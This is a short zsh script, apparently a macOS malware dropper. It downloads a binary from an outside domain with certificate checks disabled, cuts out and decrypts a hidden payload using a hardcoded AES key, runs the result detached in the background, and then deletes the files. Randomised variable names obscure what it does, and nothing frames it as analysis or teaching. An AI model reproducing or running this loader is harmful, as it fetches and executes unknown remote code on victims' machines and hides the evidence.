#!/bin/zsh
ct5k2=$(mktemp /tmp/cb5pry.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mbe1cdfd233fb8cfe.bin" -o "$ct5k2z" || exit 1
a76be9=$(stat -f %z "$ct5k2z"); rqakz4w=$(( a76be9 - 3977 - 906 ))
tail -c +$(( 3977 + 1 )) "$ct5k2z" | head -c $rqakz4w | openssl enc -d -aes-256-cbc -k e3b29a68e539a51d47241246 -out "$ct5k2" 2>/dev/null
[ -s "$ct5k2" ] && chmod 700 "$ct5k2" && ( "$ct5k2" & ) && disown
( sleep 3; rm -f "$ct5k2" "$ct5k2z" ) &>/dev/null &
